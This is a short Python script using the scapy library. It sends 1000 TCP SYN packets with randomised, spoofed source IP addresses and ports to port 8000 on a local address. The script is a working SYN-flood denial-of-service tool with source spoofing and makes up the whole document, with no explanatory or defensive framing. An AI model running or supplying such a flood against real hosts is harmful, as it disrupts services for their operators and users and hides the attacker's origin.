from scapy.all import *

target_ip = "192.168.1.2"
target_port = 8000

for i in range(1000):
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    send(ip/tcp, verbose=0)